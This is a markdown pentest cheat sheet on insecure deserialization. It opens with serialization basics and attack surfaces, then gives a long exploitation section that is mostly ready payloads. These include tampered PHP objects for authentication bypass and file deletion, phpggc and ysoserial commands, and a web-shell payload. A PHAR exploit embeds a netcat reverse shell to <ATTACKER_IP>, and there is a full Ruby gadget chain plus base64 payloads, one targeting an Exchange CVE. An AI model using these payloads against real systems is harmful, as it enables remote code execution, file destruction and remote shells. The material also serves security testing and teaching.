---
title: Insecure Deserialization
---

# Insecure Deserialization

\---



\---



\## Introduction



\### What is Serialization



It is a process to convert the complex data structures (like objects in object oriented programming) into the simpler format that can be easily stored and transferred.



\### What is Deserialization



It is the \*\*reverse process of serialization\*\*, where the \*\*simple formatted data (like JSON, XML, or binary)\*\* is converted \*\*back into its original complex data structure or object\*\*. In simple terms, \*\*deserialization rebuilds the original object from the stored or transmitted data\*\* so that the application can use it again.



The workflow looks like,



1\. An application serializes a user object and sends it over a network in \*\*JSON format\*\*.

2\. When another application receives this JSON data, it \*\*deserializes it\*\*.

3\. The JSON data is converted \*\*back into a user object\*\* that the program can work with.



\### What is Insecure Deserialization



It is a type of vulnerability that occurs when user controllable serialized data is deserialized at server side without proper input validation.



\### How the process works in different languages



\### Python



Python commonly uses the \*\*`pickle`\*\* module to serialize and deserialize Python objects.



\- \*\*Module:\*\* `pickle`

\- \*\*Serialization\*\* is converting object to byte stream



```

pickle.dumps(object)

```



\- This converts a Python object into a \*\*serialized byte format\*\* that can be stored in a file or sent over a network.

\- \*\*Deserialization\*\* (byte stream → object)



```

pickle.loads(serialized\_object)

```



\- This reconstructs the \*\*original Python object\*\* from the serialized data.

\- If untrusted data is deserialized using `pickle.loads()`, it may lead to \*\*Remote Code Execution (RCE)\*\*.



\---



\### PHP



PHP provides built-in functions to convert objects into a storable string format and reconstruct them later.



\- \*\*Serialization\*\*



```

serialize($object);

```



\- \*\*Deserialization\*\*



```

unserialize($data);

```



\- `unserialize()` can be dangerous if it processes \*\*untrusted user input\*\*, as it may trigger \*\*magic methods\*\* like `\_\_wakeup()` or `\_\_destruct()`



\---



\### Ruby



Ruby uses a process called \*\*Marshalling\*\* for object serialization.



\- \*\*Serialization\*\*



```

Marshal.dump(object)

```



\- \*\*Deserialization\*\*



```

Marshal.load(data)

```



\- This converts Ruby objects into a byte stream and restores them back into objects.



\---



\### Java



Java uses built-in \*\*object serialization\*\* through the `Serializable` interface.



\- \*\*Deserialization Method\*\*



```

readObject()

```



\- The `readObject()` method reconstructs objects from a serialized stream. If an attacker controls the serialized data, it can lead to \*\*Insecure Deserialization vulnerabilities\*\*.



\---



This version makes the \*\*fundamentals section slightly richer\*\* by:



\- Adding \*\*context\*\*

\- Explaining \*\*what each function does\*\*

\- Mentioning \*\*security risks\*\*, which is important for vulnerability notes.



\## Insecure Deserialization Attack Surfaces



\### Cookies



Serialized objects are often stored in cookies for session management or state persistence.



\*\*Look For\*\*



\- Base64 encoded blobs

\- JSON / PHP serialized strings

\- Java serialized objects



\### Hidden Form Fields



Applications sometimes serialize objects into hidden fields.



\*\*Example\*\*



```html

<inputtype="hidden"name="userObj"value="O:4:'User':1:{s:4:'role';s:4:'user';}"> 

```



\### API Request Bodies



Many modern APIs accept serialized objects.



\- \*\*JSON Deserialization\*\*



```

{

&#x20; "user":{

&#x20;   "username":"test",

&#x20;   "role":"user"

&#x20; }

}

```



\- \*\*XML Deserialization\*\*



```

<user>

<name>test</name>

<role>user</role>

</user>

```



\- \*\*YAML Deserialization\*\*



```

!!python/object/apply:os.system \["id"]

```



\### File Upload Features



Applications may deserialize uploaded files with these extensions.



\- `.ser`

\- `.bin`

\- `.dat`

\- `.xml`

\- `.json`

\- `.phar`



\### HTTP Headers



Serialized objects sometimes appear in headers.



```

X-User-Data: rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA

```



Other headers to check:



```

Authorization

X-Session

X-User

X-Auth-Token

```



\### JWT Serialization



Developers some times embed serialized objects into JWTs



```html

{

&#x20;"user":"O:4:\\"User\\":1:{s:4:\\"role\\";s:5:\\"admin\\";}"

}

```



\### WebSocket Messages



Real-time apps may send serialized objects 



```html

{

&#x20;"action":"updateUser",

&#x20;"data":"O:4:\\"User\\":1:{s:4:\\"role\\";s:5:\\"user\\";}"

}

```



\## Exploitation



\### PHP Deserialization



\#### PHP Class and Objects



```php

<?php



class User {

&#x09;	public $name;

&#x09;	public $age

&#x09;	function \_\_construct($name, $age){

&#x09;	$this->name = $name;

&#x09;	$this->age = $age;

&#x09;	}

}

$user1 = new User('bandit', 25);

echo $user1->name;

echo $user1->age;

echo serialize($user1);  # serializing object user1

?>

```



\- Serialized Object



```php

O:4:"User":2:{s:4:"name";s:4:"Adil";s:3:"age";i:24;}

```



\#### PHP Magic Methods



| Magic Method | Description | Example |

| --- | --- | --- |

| \*\*`\_\_construct`\*\* | Defines a constructor for a class. Called when a new instance is created. | `new Class()` |

| \*\*`\_\_toString`\*\* | Defines how an object reacts when treated as a string. | `echo $obj` |

| \*\*`\_\_call`\*\* | Called when you try to call inaccessible methods in an object context. | `$obj->doesntExist()` |

| \*\*`\_\_get`\*\* | Called when you try to read inaccessible properties. | `$obj->doesntExist` |

| \*\*`\_\_set`\*\* | Called when you try to write inaccessible properties. | `$obj->doesntExist = 1` |

| \*\*`\_\_clone`\*\* | Called when you try to clone an object. | `$copy = clone $object` |

| \*\*`\_\_destruct`\*\* | Called when an object is destroyed (opposite of constructor). | \*(auto-called at end of script or unset)\* |

| \*\*`\_\_isset`\*\* | Called when you use `isset()` or `empty()` on inaccessible properties. | `isset($obj->doesntExist)` |

| \*\*`\_\_invoke`\*\* | Called when you try to invoke an object as a function. | `$obj()` |

| \*\*`\_\_sleep`\*\* | Called when serializing an object. If `\_\_serialize` and `\_\_sleep` both exist, `\_\_sleep` is ignored. | `serialize($obj)` |

| \*\*`\_\_wakeup`\*\* | Called when deserializing an object. If `\_\_unserialize` and `\_\_wakeup` both exist, `\_\_wakeup` is ignored. | `unserialize($ser\_obj)` |

| \*\*`\_\_unset`\*\* | Called when you try to unset inaccessible properties. | `unset($obj->doesntExist)` |

| \*\*`\_\_callStatic`\*\* | Called when you try to call inaccessible methods in a static context. | `Class::doesntExist()` |

| \*\*`\_\_set\_state`\*\* | Called when `var\_export()` is called on an object. | `var\_export($obj, true)` |

| \*\*`\_\_debugInfo`\*\* | Called when `var\_dump()` is called on an object. | `var\_dump($obj)` |

| \*\*`\_\_unserialize`\*\* | Called when deserializing an object. Preferred over `\_\_wakeup` (PHP 7.4+). | `unserialize($obj)` |

| \*\*`\_\_serialize`\*\* | Called when serializing an object. Preferred over `\_\_sleep` (PHP 7.4+). | `serialize($obj)` |



\#### Authentication Bypass



\- \*\*`Modifying Object Attribute Value`\*\*

\- Set the boolean value to 1 in serialized PHP object to set the user as an admin user



```php

O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:1;}

```



\- Then base64 encode and send the serialized object

\- \*\*`PHP Type Juggling`\*\*

\- Loose comparison operator



```php

5 == '5j98w3u0n93'  //true 

0 == 'pa$$w0rd123'  //true 

true == 'passw0rd'  //true 

```



\- Set any `access\_token` or password value to integer data type with value `0`



```php

O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access\_token";i:0;}

```



\- Setting the binary value true



```php

a:2:{s:8:"username";b:1;s:8:"password";b:1;}

```



\#### Deleting Arbitrary Files



\- Suppose there is a user profile delete functionality, send the POST request that contains a serialized object as



```php

O:4:"User":3:{s:8:"username";s:5:"wiener";s:12:"access\_token";s:32:"orwtljhce6nd12glundbn07ori09nte7";s:11:"avatar\_link";s:18:"users/wiener/avatar";}

```



\- Change the avatar link parameter to any server side file



```php

O:4:"User":3:{s:8:"username";s:5:"wiener";s:12:"access\_token";s:32:"orwtljhce6nd12glundbn07ori09nte7";s:11:"avatar\_link";s:11:"/etc/passwd";}

```



\#### Arbitrary Object Injection



\- Backup files with \*\*`\~`\*\*



```bash

https://example.com/libs/template.php\~

```



\- Vulnerable Code



```bash

<?php



class CustomTemplate {

&#x20;   private $template\_file\_path;

&#x20;   private $lock\_file\_path;



&#x20;   public function \_\_construct($template\_file\_path) {

&#x20;       $this->template\_file\_path = $template\_file\_path;

&#x20;       $this->lock\_file\_path = $template\_file\_path . ".lock";

&#x20;   }



&#x20;   private function isTemplateLocked() {

&#x20;       return file\_exists($this->lock\_file\_path);

&#x20;   }



&#x20;   public function getTemplate() {

&#x20;       return file\_get\_contents($this->template\_file\_path);

&#x20;   }



&#x20;   public function saveTemplate($template) {

&#x20;       if (!isTemplateLocked()) {

&#x20;           if (file\_put\_contents($this->lock\_file\_path, "") === false) {

&#x20;               throw new Exception("Could not write to " . $this->lock\_file\_path);

&#x20;           }

&#x20;           if (file\_put\_contents($this->template\_file\_path, $template) === false) {

&#x20;               throw new Exception("Could not write to " . $this->template\_file\_path);

&#x20;           }

&#x20;       }

&#x20;   }



&#x20;   function \_\_destruct() {

&#x20;       // Carlos thought this would be a good idea

&#x20;       if (file\_exists($this->lock\_file\_path)) {

&#x20;           unlink($this->lock\_file\_path);

&#x20;       }

&#x20;   }

}



?>

```



\- Payload



```bash

O:14:"CustomTemplate":1:{s:14:"lock\_file\_path";s:23:"/home/carlos/morale.txt";}

```



\#### phpggc



https://github.com/ambionics/phpggc



\- Listing all available gadget chains



```bash

./phpggc -l 

```



\- For a gadget chain with RCE attack vector there are three types possible

&#x20;   - RCE (Command)

&#x20;   

&#x20;   ```bash

&#x20;   ./phpggc Laravel/RCE1 id 

&#x20;   ```

&#x20;   

&#x20;   - RCE (PHP Code)

&#x20;   

&#x20;   ```java

&#x20;   ./phpggc Laravel/RCE2 '<?php echo system($\_REQUEST\['cmd'])?>'

&#x20;   ```

&#x20;   

&#x20;   - RCE (Function Call)

&#x20;   

&#x20;   ```java

&#x20;   ./phpggc Laravel/RCE3 system id

&#x20;   ```

&#x20;   



\*\*Example\*\*



```bash

./phpggc Symfony/RCE4 system 'rm /home/carlos/morale.txt' | base64 | tr -d '\\n'

```



\- output



```bash

Tzo0NzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxUYWdBd2FyZUFkYXB0ZXIiOjI6e3M6NTc6IgBTeW1mb255XENvbXBvbmVudFxDYWNoZVxBZGFwdGVyXFRhZ0F3YXJlQWRhcHRlcgBkZWZlcnJlZCI7YToxOntpOjA7TzozMzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQ2FjaGVJdGVtIjoyOntzOjExOiIAKgBwb29sSGFzaCI7aToxO3M6MTI6IgAqAGlubmVySXRlbSI7czoyNjoicm0gL2hvbWUvY2FybG9zL21vcmFsZS50eHQiO319czo1MzoiAFN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcVGFnQXdhcmVBZGFwdGVyAHBvb2wiO086NDQ6IlN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcUHJveHlBZGFwdGVyIjoyOntzOjU0OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAcG9vbEhhc2giO2k6MTtzOjU4OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAc2V0SW5uZXJJdGVtIjtzOjY6InN5c3RlbSI7fX0K

```



\#### Phar File Upload



\- Generating exploit.phar file using a php code as



```bash

<?php

include('UserSettings.php');



$phar = new Phar("exploit.phar");

$phar->startBuffering();

$phar->addFromString('0', '');

$phar->setStub("<?php \_\_HALT\_COMPILER(); ?>");



$phar->setMetadata(new \\App\\Helpers\\UserSettings('"; nc -nv <ATTACKER\_IP> 9999 -e /bin/bash;#',

&#x20;   '\[email protected]',

&#x20;   '$2y$10$u5o6u2EbjOmobQjVtu87QO8ZwQsDd2zzoqjwS0.5zuPr3hqk9wfda',

&#x20;   'default.jpg'

));



$phar->stopBuffering();

```



\- Creates a PHAR archive with a malicious `UserSettings` object in the metadata.

\- Executes a Netcat command (nc -nv <ATTACKER\_IP> 9999 -e /bin/bash) to establish a reverse shell.

\- Ensuring phar.readonly setting is diabled

\- Upload the phar file as `image.jpeg`

\- Accessing the image as `http://example.com/image?\_=phar://uploads/image.jpeg`



\#### PHAR-JPG-Polygot



https://github.com/kunte0/phar-jpg-polyglot



\### JAVA Deserialization



\#### `ysoserial`



https://github.com/frohoff/ysoserial



\- In Java versions 16 and above, you need to set a series of command-line arguments for Java to run \*\*`ysoserial`\*\*. For example:



```java

java \\

&#x20;  --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED \\

&#x20;  --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED \\

&#x20;  --add-opens=java.base/java.net=ALL-UNNAMED \\

&#x20;  --add-opens=java.base/java.util=ALL-UNNAMED \\

&#x20;  -jar ysoserial-all.jar \[payload] '\[command]'

```



\- Using library ⇒  `Apache Commons Collections`



```java

java \\                  

&#x20; --add-opens=java.base/sun.reflect.annotation=ALL-UNNAMED \\

&#x20; --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED \\

&#x20; --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED \\

&#x20; --add-opens=java.base/java.net=ALL-UNNAMED \\

&#x20; --add-opens=java.base/java.util=ALL-UNNAMED \\

&#x20; -jar ysoserial-all.jar CommonsCollections3 "rm /home/carlos/morale.txt" > test



```



```java

base64 hehe | tr -d '\\n'

```



\#### `JMET`



https://github.com/matthiaskaiser/jmet



```bash

java -jar target/jmet-0.1.0-all.jar

```



\- XXE Exploitation Mode



```bash

$ java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -X http://192.168.85.148:8081 jmstarget 61616

```



\### RUBY Deserialization



\*\*Identifying the frame work\*\*



\- Triggering error messages

\- Tech Profiling



\*\*Payload\*\*



https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html



```ruby

\# Autoload the required classes



require 'net/http'   # <-- this defines Net::WriteAdapter

require 'rubygems'  



Gem::SpecFetcher

Gem::Installer



\# prevent the payload from running when we Marshal.dump it

module Gem

&#x20; class Requirement

&#x20;   def marshal\_dump

&#x20;     \[@requirements]

&#x20;   end

&#x20; end

end



wa1 = Net::WriteAdapter.new(Kernel, :system)



rs = Gem::RequestSet.allocate

rs.instance\_variable\_set('@sets', wa1)

rs.instance\_variable\_set('@git\_set', "rm /home/carlos/morale.txt")



wa2 = Net::WriteAdapter.new(rs, :resolve)



i = Gem::Package::TarReader::Entry.allocate

i.instance\_variable\_set('@read', 0)

i.instance\_variable\_set('@header', "aaa")



n = Net::BufferedIO.allocate

n.instance\_variable\_set('@io', i)

n.instance\_variable\_set('@debug\_output', wa2)



t = Gem::Package::TarReader.allocate

t.instance\_variable\_set('@io', n)



r = Gem::Requirement.allocate

r.instance\_variable\_set('@requirements', t)



payload = Marshal.dump(\[Gem::SpecFetcher, Gem::Installer, r])

\#puts payload



require "base64"



puts Base64.encode64(payload)

```



```ruby

ruby exploit.rb

```



\- Will give a base64 encoded data



```bash

echo 'BAhbCGMVR2VtOjpTcGVjRmV0Y2hlcmMTR2VtOjpJbnN0YWxsZXJVOhVHZW06

OlJlcXVpcmVtZW50WwZvOhxHZW06OlBhY2thZ2U6OlRhclJlYWRlcgY6CEBp

b286FE5ldDo6QnVmZmVyZWRJTwc7B286I0dlbTo6UGFja2FnZTo6VGFyUmVh

ZGVyOjpFbnRyeQc6CkByZWFkaQA6DEBoZWFkZXJJIghhYWEGOgZFVDoSQGRl

YnVnX291dHB1dG86Fk5ldDo6V3JpdGVBZGFwdGVyBzoMQHNvY2tldG86FEdl

bTo6UmVxdWVzdFNldAc6DUBnaXRfc2V0SSIfcm0gL2hvbWUvY2FybG9zL21v

cmFsZS50eHQGOwxUOgpAc2V0c287Dgc7D20LS2VybmVsOg9AbWV0aG9kX2lk

OgtzeXN0ZW07EzoMcmVzb2x2ZQ==' | tr -d '\\n'

```



\### .NET Deserialization



\- \*\*`YSoSerial.Net`\*\*



https://github.com/pwntester/ysoserial.net



```bash

./ysoserial.exe -p DotNetNuke -m read\_file -f win.ini



./ysoserial.exe -f BinaryFormatter -g PSObject -o base64 -c "calc" -t



&#x20;./ysoserial.exe -f Json.Net -g ObjectDataProvider -o raw -c "calc" -t

```



\- \*\*Generate a minified BinaryFormatter payload to exploit Exchange CVE-2021-42321 using the ActivitySurrogateDisableTypeCheck gadget inside the ClaimsPrincipal gadget.\*\*



```bash

.\\ysoserial.exe -g ClaimsPrincipal -f BinaryFormatter -c foobar -bgc ActivitySurrogateDisableTypeCheck --minify --ust



AAEAAAD/////AQAAAAAAAAAEAQAAACZTeXN0ZW0uU2VjdXJpdHkuQ2xhaW1zLkNsYWltc1ByaW5jaXBhbAEAAAAcbV9zZXJpYWxpemVkQ2xhaW1zSWRlbnRpdGllcwEGBQAAAKgfQUFFQUFBRC8vLy8vQVFBQUFBQUFBQUFNQWdBQUFFWlRlWE4wWlcwc1ZtVnljMmx2YmowMExqQXVNQzR3TEVOMWJIUjFjbVU5Ym1WMWRISmhiQ3hRZFdKc2FXTkxaWGxVYjJ0bGJqMWlOemRoTldNMU5qRTVNelJsTURnNUJRRUFBQUJBVTNsemRHVnRMa052Ykd4bFkzUnBiMjV6TGtkbGJtVnlhV011VTI5eWRHVmtVMlYwWURGYlcxTjVjM1JsYlM1VGRISnBibWNzYlhOamIzSnNhV0pkWFFRQUFBQUZRMjkxYm5RSVEyOXRjR0Z5WlhJSFZtVnljMmx2YmdWSmRHVnRjd0FEQUFZSVNWTjVjM1JsYlM1RGIyeHNaV04wYVc5dWN5NUhaVzVsY21sakxrTnZiWEJoY21semIyNURiMjF3WVhKbGNtQXhXMXRUZVhOMFpXMHVVM1J5YVc1bkxHMXpZMjl5YkdsaVhWMElBZ0FBQUFJQUFBQUpBd0FBQUFJQUFBQUpCQUFBQUFRREFBQUFTVk41YzNSbGJTNURiMnhzWldOMGFXOXVjeTVIWlc1bGNtbGpMa052YlhCaGNtbHpiMjVEYjIxd1lYSmxjbUF4VzF0VGVYTjBaVzB1VTNSeWFXNW5MRzF6WTI5eWJHbGlYVjBCQUFBQUMxOWpiMjF3WVhKcGMyOXVBeUpUZVhOMFpXMHVSR1ZzWldkaGRHVlRaWEpwWVd4cGVtRjBhVzl1U0c5c1pHVnlDUVVBQUFBUkJBQUFBQUlBQUFBR0JnQUFBQUFHQndBQUFQMExQRkpsYzI5MWNtTmxSR2xqZEdsdmJtRnllU0I0Yld4dWN6MGlhSFIwY0RvdkwzTmphR1Z0WVhNdWJXbGpjbTl6YjJaMExtTnZiUzkzYVc1bWVDOHlNREEyTDNoaGJXd3ZjSEpsYzJWdWRHRjBhVzl1SWlCNGJXeHVjenBoUFNKb2RIUndPaTh2YzJOb1pXMWhjeTV0YVdOeWIzTnZablF1WTI5dEwzZHBibVo0THpJd01EWXZlR0Z0YkNJZ2VHMXNibk02WWowaVkyeHlMVzVoYldWemNHRmpaVHBUZVhOMFpXMDdZWE56WlcxaWJIazliWE5qYjNKc2FXSWlJSGh0Ykc1ek9tTTlJbU5zY2kxdVlXMWxjM0JoWTJVNlUzbHpkR1Z0TGtOdmJtWnBaM1Z5WVhScGIyNDdZWE56WlcxaWJIazlVM2x6ZEdWdExrTnZibVpwWjNWeVlYUnBiMjRpSUhodGJHNXpPbVE5SW1Oc2NpMXVZVzFsYzNCaFkyVTZVM2x6ZEdWdExsSmxabXhsWTNScGIyNDdZWE56WlcxaWJIazliWE5qYjNKc2FXSWlQanhQWW1wbFkzUkVZWFJoVUhKdmRtbGtaWElnWVRwTFpYazlJblI1Y0dVaUlFOWlhbVZqZEZSNWNHVTlJbnRoT2xSNWNHVWdZanBVZVhCbGZTSWdUV1YwYUc5a1RtRnRaVDBpUjJWMFZIbHdaU0krUEU5aWFtVmpkRVJoZEdGUWNtOTJhV1JsY2k1TlpYUm9iMlJRWVhKaGJXVjBaWEp6UGp4aU9sTjBjbWx1Wno1VGVYTjBaVzB1VjI5eWEyWnNiM2N1UTI5dGNHOXVaVzUwVFc5a1pXd3VRWEJ3VTJWMGRHbHVaM01zVTNsemRHVnRMbGR2Y210bWJHOTNMa052YlhCdmJtVnVkRTF2WkdWc0xGWmxjbk5wYjI0OU5DNHdMakF1TUN4RGRXeDBkWEpsUFc1bGRYUnlZV3dzVUhWaWJHbGpTMlY1Vkc5clpXNDlNekZpWmpNNE5UWmhaRE0yTkdVek5Ud3ZZanBUZEhKcGJtYytQQzlQWW1wbFkzUkVZWFJoVUhKdmRtbGtaWEl1VFdWMGFHOWtVR0Z5WVcxbGRHVnljejQ4TDA5aWFtVmpkRVJoZEdGUWNtOTJhV1JsY2o0OFQySnFaV04wUkdGMFlWQnliM1pwWkdWeUlHRTZTMlY1UFNKbWFXVnNaQ0lnVDJKcVpXTjBTVzV6ZEdGdVkyVTlJbnRUZEdGMGFXTlNaWE52ZFhKalpTQjBlWEJsZlNJZ1RXVjBhRzlrVG1GdFpUMGlSMlYwUm1sbGJHUWlQanhQWW1wbFkzUkVZWFJoVUhKdmRtbGtaWEl1VFdWMGFHOWtVR0Z5WVcxbGRHVnljejQ4WWpwVGRISnBibWMrWkdsellXSnNaVUZqZEdsMmFYUjVVM1Z5Y205bllYUmxVMlZzWldOMGIzSlVlWEJsUTJobFkyczhMMkk2VTNSeWFXNW5QanhrT2tKcGJtUnBibWRHYkdGbmN6NDBNRHd2WkRwQ2FXNWthVzVuUm14aFozTStQQzlQWW1wbFkzUkVZWFJoVUhKdmRtbGtaWEl1VFdWMGFHOWtVR0Z5WVcxbGRHVnljejQ4TDA5aWFtVmpkRVJoZEdGUWNtOTJhV1JsY2o0OFQySnFaV04wUkdGMFlWQnliM1pwWkdWeUlHRTZTMlY1UFNKelpYUWlJRTlpYW1WamRFbHVjM1JoYm1ObFBTSjdVM1JoZEdsalVtVnpiM1Z5WTJVZ1ptbGxiR1I5SWlCTlpYUm9iMlJPWVcxbFBTSlRaWFJXWVd4MVpTSStQRTlpYW1WamRFUmhkR0ZRY205MmFXUmxjaTVOWlhSb2IyUlFZWEpoYldWMFpYSnpQanhpT2s5aWFtVmpkQzgrUEdJNlFtOXZiR1ZoYmo1MGNuVmxQQzlpT2tKdmIyeGxZVzQrUEM5UFltcGxZM1JFWVhSaFVISnZkbWxrWlhJdVRXVjBhRzlrVUdGeVlXMWxkR1Z5Y3o0OEwwOWlhbVZqZEVSaGRHRlFjbTkyYVdSbGNqNDhUMkpxWldOMFJHRjBZVkJ5YjNacFpHVnlJR0U2UzJWNVBTSnpaWFJOWlhSb2IyUWlJRTlpYW1WamRFbHVjM1JoYm1ObFBTSjdZVHBUZEdGMGFXTWdZenBEYjI1bWFXZDFjbUYwYVc5dVRXRnVZV2RsY2k1QmNIQlRaWFIwYVc1bmMzMGlJRTFsZEdodlpFNWhiV1U5SWxObGRDSStQRTlpYW1WamRFUmhkR0ZRY205MmFXUmxjaTVOWlhSb2IyUlFZWEpoYldWMFpYSnpQanhpT2xOMGNtbHVaejV0YVdOeWIzTnZablE2VjI5eWEyWnNiM2REYjIxd2IyNWxiblJOYjJSbGJEcEVhWE5oWW14bFFXTjBhWFpwZEhsVGRYSnliMmRoZEdWVFpXeGxZM1J2Y2xSNWNHVkRhR1ZqYXp3dllqcFRkSEpwYm1jK1BHSTZVM1J5YVc1blBuUnlkV1U4TDJJNlUzUnlhVzVuUGp3dlQySnFaV04wUkdGMFlWQnliM1pwWkdWeUxrMWxkR2h2WkZCaGNtRnRaWFJsY25NK1BDOVBZbXBsWTNSRVlYUmhVSEp2ZG1sa1pYSStQQzlTWlhOdmRYSmpaVVJwWTNScGIyNWhjbmsrQkFVQUFBQWlVM2x6ZEdWdExrUmxiR1ZuWVhSbFUyVnlhV0ZzYVhwaGRHbHZia2h2YkdSbGNnTUFBQUFJUkdWc1pXZGhkR1VIYldWMGFHOWtNQWR0WlhSb2IyUXhBd01ETUZONWMzUmxiUzVFWld4bFoyRjBaVk5sY21saGJHbDZZWFJwYjI1SWIyeGtaWElyUkdWc1pXZGhkR1ZGYm5SeWVTOVRlWE4wWlcwdVVtVm1iR1ZqZEdsdmJpNU5aVzFpWlhKSmJtWnZVMlZ5YVdGc2FYcGhkR2x2YmtodmJHUmxjaTlUZVhOMFpXMHVVbVZtYkdWamRHbHZiaTVOWlcxaVpYSkpibVp2VTJWeWFXRnNhWHBoZEdsdmJraHZiR1JsY2drSUFBQUFDUWtBQUFBSkNnQUFBQVFJQUFBQU1GTjVjM1JsYlM1RVpXeGxaMkYwWlZObGNtbGhiR2w2WVhScGIyNUliMnhrWlhJclJHVnNaV2RoZEdWRmJuUnllUWNBQUFBRWRIbHdaUWhoYzNObGJXSnNlUVowWVhKblpYUVNkR0Z5WjJWMFZIbHdaVUZ6YzJWdFlteDVEblJoY21kbGRGUjVjR1ZPWVcxbENtMWxkR2h2WkU1aGJXVU5aR1ZzWldkaGRHVkZiblJ5ZVFFQkFnRUJBUU13VTNsemRHVnRMa1JsYkdWbllYUmxVMlZ5YVdGc2FYcGhkR2x2YmtodmJHUmxjaXRFWld4bFoyRjBaVVZ1ZEhKNUJnc0FBQUF1VTNsemRHVnRMa1oxYm1OZ01sdGJVM2x6ZEdWdExsTjBjbWx1WjEwc1cxTjVjM1JsYlM1UFltcGxZM1JkWFFZTUFBQUFDRzF6WTI5eWJHbGlDZ1lOQUFBQVZWQnlaWE5sYm5SaGRHbHZia1p5WVcxbGQyOXlheXhXWlhKemFXOXVQVFF1TUM0d0xqQXNRM1ZzZEhWeVpUMXVaWFYwY21Gc0xGQjFZbXhwWTB0bGVWUnZhMlZ1UFRNeFltWXpPRFUyWVdRek5qUmxNelVHRGdBQUFDQlRlWE4wWlcwdVYybHVaRzkzY3k1TllYSnJkWEF1V0dGdGJGSmxZV1JsY2dZUEFBQUFCVkJoY25ObENSQUFBQUFFQ1FBQUFDOVRlWE4wWlcwdVVtVm1iR1ZqZEdsdmJpNU5aVzFpWlhKSmJtWnZVMlZ5YVdGc2FYcGhkR2x2YmtodmJHUmxjZ1lBQUFBRVRtRnRaUXhCYzNObGJXSnNlVTVoYldVSlEyeGhjM05PWVcxbENWTnBaMjVoZEhWeVpRcE5aVzFpWlhKVWVYQmxFRWRsYm1WeWFXTkJjbWQxYldWdWRITUJBUUVCQUFNSURWTjVjM1JsYlM1VWVYQmxXMTBKRHdBQUFBa05BQUFBQ1E0QUFBQUdGQUFBQUNKVGVYTjBaVzB1VDJKcVpXTjBJRkJoY25ObEtGTjVjM1JsYlM1VGRISnBibWNwQ0FBQUFBb0JDZ0FBQUFrQUFBQUdGUUFBQUFkRGIyMXdZWEpsQ1F3QUFBQUdGd0FBQUExVGVYTjBaVzB1VTNSeWFXNW5CaGdBQUFBclNXNTBNeklnUTI5dGNHRnlaU2hUZVhOMFpXMHVVM1J5YVc1bkxDQlRlWE4wWlcwdVUzUnlhVzVuS1FnQUFBQUtBUkFBQUFBSUFBQUFCaGtBQUFBa1UzbHpkR1Z0TGtOdmJYQmhjbWx6YjI1Z01WdGJVM2x6ZEdWdExsTjBjbWx1WjExZENRd0FBQUFLQ1F3QUFBQUpGd0FBQUFrVkFBQUFDZ3M9Cw==



```



\*\*Formatters\*\*



!\[](https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/Insecure%20Deserialization/Images/NETNativeFormatters.png)



\#### XMLSerializer



\- In C# source code, look for `XmlSerializer(typeof(<TYPE>));`

\- The attacker must control the \*\*type\*\* of the XmlSerializer.



```bash

$ .\\ysoserial.exe -g ObjectDataProvider -f XmlSerializer -c "calc.exe"



<?xml version="1.0"?>

<root type="System.Data.Services.Internal.ExpandedWrapper`2\[\[System.Windows.Markup.XamlReader, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35],\[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089">

&#x20;   <ExpandedWrapperOfXamlReaderObjectDataProvider xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" >

&#x20;       <ExpandedElement/>

&#x20;       <ProjectedProperty0>

&#x20;           <MethodName>Parse</MethodName>

&#x20;           <MethodParameters>

&#x20;               <anyType xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xsi:type="xsd:string">

&#x20;                   <!\[CDATA\[<ResourceDictionary xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation" xmlns:d="http://schemas.microsoft.com/winfx/2006/xaml" xmlns:b="clr-namespace:System;assembly=mscorlib" xmlns:c="clr-namespace:System.Diagnostics;assembly=system"><ObjectDataProvider d:Key="" ObjectType="{d:Type c:Process}" MethodName="Start"><ObjectDataProvider.MethodParameters><b:String>cmd</b:String><b:String>/c calc.exe</b:String></ObjectDataProvider.MethodParameters></ObjectDataProvider></ResourceDictionary>]]>

&#x20;               </anyType>

&#x20;           </MethodParameters>

&#x20;           <ObjectInstance xsi:type="XamlReader"></ObjectInstance>

&#x20;       </ProjectedProperty0>

&#x20;   </ExpandedWrapperOfXamlReaderObjectDataProvider>

</root>

```



\#### DataContractSerializer



\- The DataContractSerializer deserializes in a loosely coupled way. It never reads common language runtime (CLR) type and assembly names from the incoming data. The security model for the XmlSerializer is similar to that of the DataContractSerializer, and differs mostly in details. For example, the XmlIncludeAttribute attribute is used for type inclusion instead of the KnownTypeAttribute attribute.

\- In C# source code, look for `DataContractSerializer(typeof(<ATTACKER\_CONTROLLED>))`

\- Payload output: \*\*XML\*\*



\#### \*\*NetDataContractSerializer\*\*



\- It extends the `System.Runtime.Serialization.XmlObjectSerializer` class and is capable of serializing any type annotated with serializable attribute as `BinaryFormatter`

\- In C# source code, look for NetDataContractSerializer().ReadObject()



```bash

.\\ysoserial.exe -f NetDataContractSerializer -g TypeConfuseDelegate -c "calc.exe" -o base64 -t

